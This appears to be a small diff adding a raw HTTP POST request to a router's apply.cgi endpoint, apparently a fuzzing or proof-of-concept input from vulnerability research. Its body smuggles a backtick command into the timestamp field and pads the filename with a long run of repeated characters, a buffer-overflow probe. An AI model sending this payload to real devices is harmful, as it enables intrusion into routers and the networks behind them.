@@ -1,0 +1,6 @@
+POST /apply.cgi?setobject.cgi?/cgi-bin/ca_wireless_mode.htm HTTP/1.1
+Host: 127
+Content-Type: application/json
+Content-Length: 206
+
+hidden_lang_avi='wzq'&submit_flag=apply_qos&%20timestamp=\n`wzq`&filename=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa
